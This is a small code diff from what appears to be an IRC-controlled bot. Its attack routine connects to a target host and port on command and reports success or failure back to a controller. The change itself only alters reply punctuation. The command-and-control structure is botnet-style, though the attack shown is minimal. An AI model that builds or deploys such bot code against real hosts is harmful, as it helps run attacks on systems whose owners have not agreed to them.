@@ -81,10 +81,10 @@ def attack(s, sender, host, port):
     try:
         attack_socket.connect((host, port))
         attack_socket.send(bytearray('ATTACK COUNTER: ' + str(COUNTER) + ' BOT NAME: ' + NICK + '\n', 'utf-8'))
-        s.send(bytearray('PRIVMSG ' + sender + ' :' + NICK + ': attack success\r\n', 'utf-8'))
+        s.send(bytearray('PRIVMSG ' + sender + ' :' + NICK + '- attack success\r\n', 'utf-8'))
         COUNTER = COUNTER + 1
     except:
-        s.send(bytearray('PRIVMSG ' + sender + ' :' + NICK + ' : attack failed\r\n', 'utf-8'))
+        s.send(bytearray('PRIVMSG ' + sender + ' :' + NICK + ' - attack failed\r\n', 'utf-8'))
 
 def shutdown(sender):
     # send notif to controller
